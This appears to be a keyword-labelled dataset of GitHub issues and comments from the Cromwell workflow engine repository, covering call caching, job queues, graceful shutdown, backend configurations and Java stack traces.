Performance,"It would be great to have at least some unit tests targeted towards key request flows that CromIAM is expected to perform.; This should include correct order of the requests between SAM <-> CromIAM <-> Cromwell and validity of the responses.; Mocks of SAM and Cromwell could be useful to not depend on real implementation. A/C: This ticket is a good example of something that it would be nice for those unit tests to catch: https://github.com/broadinstitute/cromwell/issues/4284; Other example would be:; - A submit requests first goes to sam to check against the whitelist before going to Cromwell (if whitelisted), or returning an error (if not)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4286:114,perform,perform,114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4286,1,['perform'],['perform']
Performance,"It would be nice to have a rest Endpoint which would cause Cromwell to stop launching any new Jobs, wait for a terminal state in all of the current jobs, then gracefully shutdown after a set delay. The use case for this is an attempt to scale cromwell. We run a large number of workflows are and monitor the number of workflows per machine, sometimes we need to increase the number of cromwells to accomodate the load, but then want to shut them off later",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2595:413,load,load,413,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2595,1,['load'],['load']
Performance,"It would be nice to have a way to shutdown a Cromwell server gracefully.; By that I mean give it time to clear up any ""queued work"", mostly for actors talking to the database.; This would ensure that nothing is left un-persisted and generally allow for cleaner restarts.; This is probably a significant amount work but just wanted to get it out there.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2373:119,queue,queued,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2373,1,['queue'],['queued']
Performance,It would be nice to know when upgrading to a new version of Cromwell if calls cached by the previous version are expected to be usable in the new version.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/685:78,cache,cached,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/685,1,['cache'],['cached']
Performance,"It would be useful both for Cromwell's performance and users of the metadata endpoint to be able to filter further the data returned by the metadata endpoint to only include a specific call. A/C: ; - I can add a query parameter to the metadata endpoint to target a specific call in the workflow (using its call alias name). This would return all shards and attempts matching this call.; - I can also add another query parameter to target a specific shard. This would return all the attempts matching this shard.; - I can also add another query parameter to target a specific attempt. This would target that attempt.; - Those 3 new query parameters could be used in combination or not and should work on their own.; - They should interact properly with the existing `includeKey` and `excludeKey` parameters. e.g: `workflows/v1/f3e6cbbf-bad0-40c9-a301-1b6ff0979d68/metadata?callName=hello&callIndex=5&callAttempt=1&includeKey=inputs`. ```json; {; ""wf_hello.hello"": [; {; ""inputs"": {; ""addressee"": ""you!""; },; ""attempt"": 1,; ""shardIndex"": 5; }; ]; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4340:39,perform,performance,39,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4340,1,['perform'],['performance']
Performance,"It'd be nice to show off the task runtime options in these tests too, e.g. ""don't write to cache"" and ""don't read from cache""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/325#issuecomment-164567205:91,cache,cache,91,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/325#issuecomment-164567205,2,['cache'],['cache']
Performance,"It's a dependency resolution error, which seems surprising. I cleared Travis cache and restarted.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-505586193:77,cache,cache,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4919#issuecomment-505586193,2,['cache'],['cache']
Performance,"It's possible there could be race conditions with this: submissions that were accepted but haven't been persisted yet, or persisted workflows that don't have workflow actors yet. I'm starting to think that state data is more useful than I originally thought...",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-201066311:29,race condition,race conditions,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-201066311,1,['race condition'],['race conditions']
Performance,"It's really a question of time and cost efficiency, but since we've got the; actual GATK team and joint calling authors working on the pipeline we'll; definitely take advantage of all the features there are (and they'll write; the ones we need!). ---. Kristian Cibulskis; Chief Architect, Data Sciences & Data Engineering; Broad Institute of MIT and Harvard; kcibul@broadinstitute.org. On Thu, Jun 23, 2016 at 11:55 AM, Paul Grosu notifications@github.com; wrote:. > @kcibul https://github.com/kcibul I believe GATK can perform; > incremental joint calling, so then you should be able to use a collection; > of Cromwells submissions to build it up. Would that work?; > ; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1058#issuecomment-228096103,; > or mute the thread; > https://github.com/notifications/unsubscribe/ABW4gxuO55o58LyKHTfSEVvS97Z1-7Nxks5qOqxWgaJpZM4I8rmu; > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1058#issuecomment-228109757:520,perform,perform,520,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1058#issuecomment-228109757,1,['perform'],['perform']
Performance,It's still possible to flood MySQL but that's another problem with a different solution and requires a lot more load. This was closed by #1836,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-274632528:112,load,load,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-274632528,1,['load'],['load']
Performance,Iterator.next(ServiceLoader.java:404); 	at java.util.ServiceLoader$1.next(ServiceLoader.java:480); 	at software.amazon.awssdk.core.internal.http.loader.ClasspathSdkHttpServiceProvider.loadService(ClasspathSdkHttpServiceProvider.java:53); 	at java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:193); 	at java.util.Spliterators$ArraySpliterator.tryAdvance(Spliterators.java:958); 	at java.util.stream.ReferencePipeline.forEachWithCancel(ReferencePipeline.java:126); 	at java.util.stream.AbstractPipeline.copyIntoWithCancel(AbstractPipeline.java:498); 	at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:485); 	at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:471); 	at java.util.stream.FindOps$FindOp.evaluateSequential(FindOps.java:152); 	at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234); 	at java.util.stream.ReferencePipeline.findFirst(ReferencePipeline.java:464); 	at software.amazon.awssdk.core.internal.http.loader.SdkHttpServiceProviderChain.loadService(SdkHttpServiceProviderChain.java:44); 	at software.amazon.awssdk.core.internal.http.loader.CachingSdkHttpServiceProvider.loadService(CachingSdkHttpServiceProvider.java:46); 	at software.amazon.awssdk.core.internal.http.loader.DefaultSdkHttpClientBuilder.buildWithDefaults(DefaultSdkHttpClientBuilder.java:40); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.lambda$resolveSyncHttpClient$4(SdkDefaultClientBuilder.java:245); 	at java.util.Optional.orElseGet(Optional.java:267); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.resolveSyncHttpClient(SdkDefaultClientBuilder.java:245); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.finalizeSyncConfiguration(SdkDefaultClientBuilder.java:210); 	at software.amazon.awssdk.core.client.builder.SdkDefaultClientBuilder.syncClientConfiguration(SdkDefaultClientBuilder.java:148); 	at software.amazon.awssdk.services.sts.DefaultStsClientBuilder.bui,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273:7095,load,loader,7095,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5056#issuecomment-507840273,2,['load'],['loader']
Performance,"JECT"". ## Base bucket for workflow executions; root = ""$BUCKET""; name-for-call-caching-purposes: PAPI; #60000/min in google; ##genomics-api-queries-per-100-seconds = 90000; virtual-private-cloud {; network-name = ""$NET""; subnetwork-name = ""$SUBNET""; }; // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600; 	 request-workers = 4; batch-timeout = 7 days; 	 # Emit a warning if jobs last longer than this amount of time. This might indicate that something got stuck in PAPI.; 	 slow-job-warning-time: 24 hours; genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; compute-service-account = ""default""; # Restrict access to VM metadata. Useful in cases when untrusted containers are running under a service; # account not owned by the submitting user; restrict-metadata-access = false; ## Location; location = ""europe-west1"". ; }. filesystems {; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; project = ""$PROJECT""; caching {; # When a cache hit is found, the following duplication strategy will be followed to use the cached outputs; # Possible values: ""copy"", ""reference"". Defaults to ""copy""; # ""copy"": Copy the output files; # ""reference"": DO NOT copy the output files but point to the original output files instead.; # Will still make sure than all the original output files exist and are accessible before; # going forward with the cache hit.; duplication-strategy = ""reference""; }; }; }. default-runtime-attributes {; cpu: 1; failOnStderr: false; continueOnReturnCode: 0; memory: ""2 GB""; bootDiskSizeGb: 10; # Allowed to be a String, or a list of Strings; disks: ""local-disk 10 HDD""; noAddress: false; preemptible: 1; zones: [""europe-west1-b""]; }; }; }; }; }. database {; ...; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:11112,cache,cache,11112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,3,['cache'],"['cache', 'cached']"
Performance,JES gave an intermittent 404 error when trying to copy outputs from the cached call directory to the current call directory (discovered by Vivek when using Call Caching for GoTC) . AC: Have Cromwell retry Call Caching when upon receipt of the 404 error.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/517:72,cache,cached,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/517,1,['cache'],['cached']
Performance,Jes cache hit copying closes #1369,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1394:4,cache,cache,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1394,1,['cache'],['cache']
Performance,Jes specific cache copying,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1369:13,cache,cache,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1369,1,['cache'],['cache']
Performance,"JesBackend.scala:123); at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$createJesRun(JesBackend.scala:573); at cromwell.engine.backend.jes.JesBackend$$anonfun$35.apply(JesBackend.scala:707); at cromwell.engine.backend.jes.JesBackend$$anonfun$35.apply(JesBackend.scala:706); at scala.util.Success.flatMap(Try.scala:231); at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$runWithJes(JesBackend.scala:706); at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:362); at cromwell.engine.backend.jes.JesBackend$$anonfun$executeOrResume$1.apply(JesBackend.scala:350); at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-04-28 15:35:51,730] [warn] JesBackend [1cb9c1d2:jes_task]: Exception occurred while creating JES Run. Retrying in 4742 (9 more retries)...; ```. I've walked through the stacktrace and can't see anything obviously wrong with the JesAttachedDisk.scala code, which is just running an md5sum on the params of the disk, so that should always result in a string of characters that is legal to use for a disk name, according to the provided link. I have the sense that the problem may lie in the google pipelines api code, after the params are handed off to create a pipeline. The particular disk name that's causing a problem in this example is `4fd1d1e01455dfdd4eabcf02c1abaf55`",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/757:5469,concurren,concurrent,5469,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/757,4,['concurren'],['concurrent']
Performance,Job Store should use simpletons just like Call Cache,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1280:47,Cache,Cache,47,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1280,1,['Cache'],['Cache']
Performance,"JobExecutionActor.scala:211); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:588); at akka.actor.ActorCell.invoke(ActorCell.scala:557); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:258); at akka.dispatch.Mailbox.run(Mailbox.scala:225); at akka.dispatch.Mailbox.exec(Mailbox.scala:235); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: scala.NotImplementedError: This should not happen, please report this; at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:281); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatus(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$pollStatusAsync$1(StandardAsyncExecutionActor.scala:691); at scala.util.Try$.apply(Try.scala:209); ... 25 more; ```; This is our configuration for PBS:; ```; PBSPRO {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; ; runtime-attributes = """"""; Int cpu = 1; Int memory_mb = 2048; String queue = ""normal""; String account = """"; String walltime = ""48:00:00""; ; Int? cpuMin; Int? cpuMax; Int? memoryMin; Int? memoryMax; String? outDirMin; String? outDirMax; String? tmpDirMin; String? tmpDirMax; """"""; submit = """"""; qsub -V -l wd -N ${job_name} -o ${out} -e ${err} -q ${queue} -l walltime=${walltime} -l ncpus=${cpu} -l mem=${memory_mb}mb -- /usr/bin/env bash ${script}; """"""; kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+).*""; filesystems {. local {; localization: [""soft-link""]; caching {; duplication-strategy: [""soft-link""]; hashing-strategy: ""path""; }; }; }. }; }; ```; Thanks for any tips or pointers.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:4518,queue,queue,4518,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,2,['queue'],['queue']
Performance,JobStoreWriterActor can become a bottleneck when lots of jobs are finishing at the same time,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2085:33,bottleneck,bottleneck,33,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2085,1,['bottleneck'],['bottleneck']
Performance,Jobs queued up instead of running. Turns out one job was trying to copy files without permissions over and over. [More info](https://docs.google.com/document/d/1mHbgzS7UlodljgV8JVk3QWHMqXn8kZNu-x8jFql7vX0/edit?usp=sharing),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3511:5,queue,queued,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3511,1,['queue'],['queued']
Performance,"Just a comment when there is a cache _hit_: For intermediate files (outputs of one task going into another), on local and SGE backends, we should not copy the files (symlink or hardlink would be preferred). Just to conserve storage, CPU, and time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1236#issuecomment-242167982:31,cache,cache,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1236#issuecomment-242167982,1,['cache'],['cache']
Performance,"Just adding confirmation that I'm receiving the same error for localizing WDL directories (in the development spec). Notably, if you use the cached-copy strategy, it will result in copying your directories twice - as I understand, Cromwell won't be able to hard-link the original directory so copies it to `cached directory) and hence copies it again. Not a big deal that would get solved by fixes mentioned earlier, but in case anyone finds themselves where I am.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5737#issuecomment-686181004:141,cache,cached-copy,141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5737#issuecomment-686181004,2,['cache'],"['cached', 'cached-copy']"
Performance,"Just realized that last comment was especially well related how `write_lines` interacts with CC, maybe we can reconsider how CC interprets actual input values vs. Declarations (i.e. if the inputs are the same then any declarations will be the same too, so let's not cache expression results?)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305999959:266,cache,cache,266,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2309#issuecomment-305999959,1,['cache'],['cache']
Performance,"Just to be clear the ""tasks"" referred to here are Slick tasks and not Cromwell / WDL tasks (that error message is produced by the Slick library). I'm speculating a bit but it may be that the unrestricted query was tying up the database for so long that too many tasks backed up behind it and overflowed the Slick task queue of size 1000. More restrictive server-side filtering like you're doing now definitely seems like a good idea. 🙂",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-394784516:318,queue,queue,318,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2182#issuecomment-394784516,2,['queue'],['queue']
Performance,"Just wanted to report a behavior I saw while trying to scale Cromwell horizontally. I haven't had time to take a look to it but is related to metadata and the way that is written in the database. How to reproduce:; 1. Deploy:; 1 VM with Nginx to act as the load balancer; 2 VMs with Cromwell 29; 1 VM with MySQL 5.6.36. 2. Submit Hello World workflow 10000 times. 3. Try to get status for some/all workflows while workflows are being processed. 4. These issues are manifested:. Duplicated entry exception (this one happens repeatedly) =>; ``` ; 2017-07-13 22:07:39,149 cromwell-system-akka.dispatchers.service-dispatcher-243 ERROR - Failed to summarize metadata; com.mysql.jdbc.exceptions.jdbc4.MySQLIntegrityConstraintViolationException: Duplicate entry 'cromwell-workflow-id-cromwell-6d021019-ac3f-4a28-b034-d58fb92022' for key 'UC_CUSTOM_LABEL_ENTRY_CLK_CLV_WEU'; 	at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method); 	at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62); 	at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45); 	at java.lang.reflect.Constructor.newInstance(Constructor.java:423); 	at com.mysql.jdbc.Util.handleNewInstance(Util.java:425); 	at com.mysql.jdbc.Util.getInstance(Util.java:408); 	at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:935); 	at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:3973); 	at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:3909); 	at com.mysql.jdbc.MysqlIO.sendCommand(MysqlIO.java:2527); 	at com.mysql.jdbc.MysqlIO.sqlQueryDirect(MysqlIO.java:2680); 	at com.mysql.jdbc.ConnectionImpl.execSQL(ConnectionImpl.java:2490); 	at com.mysql.jdbc.PreparedStatement.executeInternal(PreparedStatement.java:1858); 	at com.mysql.jdbc.PreparedStatement.executeUpdateInternal(PreparedStatement.java:2079); 	at com.mysql.jdbc.PreparedStatement.executeUpdateInternal(PreparedStatement.java:2013); 	at com.mysql.jdbc.PreparedSta",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2452:257,load,load,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2452,1,['load'],['load']
Performance,"Kate Noblett asked a question, via Slack, about a user who could not view a workflow's details via the FireCloud UI. I first loaded that same workflow in my own browser, then attempted to make a direct API query for that workflow via Rawls. So yes - I was running a query - but it was the same one the end user was making: a specific workflow whose metadata was expensive to calculate.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4093#issuecomment-421397783:125,load,loaded,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4093#issuecomment-421397783,1,['load'],['loaded']
Performance,Keep the transient google communication errors in the poll queue Closes #1665,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1686:59,queue,queue,59,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1686,1,['queue'],['queue']
Performance,Known TODOs (maybe in later tickets); - Backends should use runtime attributes in jobDescriptor instead of recomputing them; - SharedFileSystem `runtimeAttributeDefinitions` are static instead of dynamic; - No short-circuiting if cache miss is known and cache writing is off; - Test writing,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1307:230,cache,cache,230,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1307,2,['cache'],['cache']
Performance,"L "" sequence_group_interval}; }; runtime {; docker: ""us.gcr.io/broad-gotc-prod/genomes-in-the-cloud:2.3.2-1510681135""; memory: ""6 GB""; disks: ""local-disk "" + disk_size + "" HDD""; preemptible: preemptible_tries; }; output {; File recalibration_report = ""${recalibration_report_filename}""; }; }; ```. And here is my cromwell server config:. ```scala; include required(classpath(""application"")). webservice {; port = 8000; }. system {; workflow-restart = true; }. engine {; filesystems {. gcs {; auth = ""service-account""; }. http {}. local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]; }; }; }. backend {; default = ""Local""; providers {. Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; max-concurrent-workflows = 1; concurrent-job-limit = 1; }; }. PAPIv2 {; actor-factory = ""cromwell.backend.google.pipelines.v2alpha1.PipelinesApiLifecycleActorFactory""; config {; project = ""bioinfo-XXXXXXX""; root = ""gs://XXXXXXXX""; genomics-api-queries-per-100-seconds = 1000; max-concurrent-workflows = 80; concurrent-job-limit = 200; maximum-polling-interval = 600. genomics {; # Config from google stanza; auth = ""service-account"". ; # Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/""; localization-attempts = 3; }. filesystems {; gcs {; # A reference to a potentially different auth for manipulating files via engine functions.; auth = ""service-account""; }; }; }; }; }; }. # Google authentication; google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; },; {; name = ""service-account""; scheme = ""service_account""; service-account-id = ""XXXXXXXXXXXXXX@XXXXXXXXXXXX.gserviceaccount.com""; json-file = ""/var/secrets/google/key.json""; }; ]; }. # database connection; database {; profile = ""slick.jdbc.MySQLProfile$""; db {; driver = ""com.mysql.jdbc.Driver""; url = ""jdbc:mysql://cromwell-db/cromwell?rewriteBatchedStat",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4336:2318,concurren,concurrent-workflows,2318,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4336,2,['concurren'],"['concurrent-job-limit', 'concurrent-workflows']"
Performance,Labels query performance,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4598:13,perform,performance,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4598,1,['perform'],['performance']
Performance,Labels query performance improvement,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4610:13,perform,performance,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4610,1,['perform'],['performance']
Performance,"Launch any workflow, let it run long enough to start a job in GCP Batch. Shut down Cromwell, restart Cromwell:. ```; 2024-08-19 14:47:51 cromwell-system-akka.dispatchers.engine-dispatcher-5 INFO - Cromwell 88-e59a6aa-SNAP service started on 0:0:0:0:0:0:0:0:8000...; 2024-08-19 14:47:51 cromwell-system-akka.dispatchers.engine-dispatcher-55 INFO - MaterializeWorkflowDescriptorActor [UUID(119e11a5)]: Call-to-Backend assignments: wf_hello.hello -> GCPBATCH; 2024-08-19 14:47:52 cromwell-system-akka.dispatchers.engine-dispatcher-54 INFO - WorkflowExecutionActor-119e11a5-b981-4510-a6d9-b5c26dfbb4e3 [UUID(119e11a5)]: Restarting wf_hello.hello; 2024-08-19 14:47:53 cromwell-system-akka.dispatchers.engine-dispatcher-53 INFO - Assigned new job restart checking tokens to the following groups: 119e11a5: 1; 2024-08-19 14:47:55 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - Not triggering log of restart checking token queue status. Effective log interval = None; 2024-08-19 14:47:55 cromwell-system-akka.dispatchers.engine-dispatcher-41 INFO - Triggering log of execution token queue status. Effective log interval = 300 seconds; 2024-08-19 14:48:00 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - Assigned new job execution tokens to the following groups: 119e11a5: 1; 2024-08-19 14:48:00 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - BT-322 119e11a5:wf_hello.hello:-1:1 is eligible for call caching with read = true and write = true; 2024-08-19 14:48:00 cromwell-system-akka.dispatchers.engine-dispatcher-43 INFO - BT-322 119e11a5:wf_hello.hello:-1:1 cache hit copying nomatch: could not find a suitable cache hit.; 2024-08-19 14:48:00 cromwell-system-akka.dispatchers.engine-dispatcher-43 INFO - 119e11a5-b981-4510-a6d9-b5c26dfbb4e3-EngineJobExecutionActor-wf_hello.hello:NA:1 [UUID(119e11a5)]: Could not copy a suitable cache hit for 119e11a5:wf_hello.hello:-1:1. No copy attempts were made.; 2024-08-19 14:48:00 cromwell-system-akka.dispatchers.backend-disp",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7495:929,queue,queue,929,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7495,1,['queue'],['queue']
Performance,Less metadata repetition during call cache copying [BA-6306],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5444:37,cache,cache,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5444,1,['cache'],['cache']
Performance,Less metadata repetition during call cache copying: 49 hotfix edition [BA-6306],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5445:37,cache,cache,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5445,1,['cache'],['cache']
Performance,"Let me know if there is any more information that would be useful. Thanks. Workflow Id:. `129f0510-5d6b-4c4c-b266-116a9a52f325`. Step meta data:. ```. {; ""preemptible"": false,; ""executionStatus"": ""Failed"",; ""stdout"": ""gs://broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/129f0510-5d6b-4c4c-b266-116a9a52f325/call-CollectQualityYieldMetrics/shard-2/CollectQualityYieldMetrics-2-stdout.log"",; ""backendStatus"": ""Failed"",; ""shardIndex"": 2,; ""outputs"": {. },; ""runtimeAttributes"": {; ""preemptible"": ""0"",; ""failOnStderr"": ""false"",; ""bootDiskSizeGb"": ""10"",; ""disks"": ""local-disk 100 HDD"",; ""continueOnReturnCode"": ""0"",; ""docker"": ""broadinstitute/genomes-in-the-cloud:2.0.0"",; ""cpu"": ""1"",; ""zones"": ""us-central1-c"",; ""memory"": ""2 GB""; },; ""cache"": {; ""allowResultReuse"": true; },; ""inputs"": {; ""disk_size"": ""flowcell_small_disk"",; ""input_bam"": ""unmapped_bam"",; ""metrics_filename"": ""sub(sub(unmapped_bam, sub_strip_path, \""\""), sub_strip_unmapped, \""\"") + \"".unmapped.quality_yield_metrics\""""; },; ""failures"": [{; ""failure"": ""Task 129f0510-5d6b-4c4c-b266-116a9a52f325:CollectQualityYieldMetrics failed: error code 10. Message: 13: VM ggp-12606127296447203756 shut down unexpectedly."",; ""timestamp"": ""2016-04-24T20:04:45.145Z""; }],; ""jobId"": ""operations/EIXH28fEKhisk93Qxr_9-K4BIJ-ikOmeDSoPcHJvZHVjdGlvblF1ZXVl"",; ""backend"": ""JES"",; ""end"": ""2016-04-24T20:04:45.000Z"",; ""stderr"": ""gs://broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/129f0510-5d6b-4c4c-b266-116a9a52f325/call-CollectQualityYieldMetrics/shard-2/CollectQualityYieldMetrics-2-stderr.log"",; ""attempt"": 1,; ""executionEvents"": [],; ""backendLogs"": {; ""log"": ""gs://broad-gotc-prod-storage/cromwell_execution/PairedEndSingleSampleWorkflow/129f0510-5d6b-4c4c-b266-116a9a52f325/call-CollectQualityYieldMetrics/shard-2/CollectQualityYieldMetrics-2.log""; },; ""start"": ""2016-04-24T15:50:19.000Z""; }. ```. Log stack trace: . ```; 3589853:2016-04-24 20:04:45,142 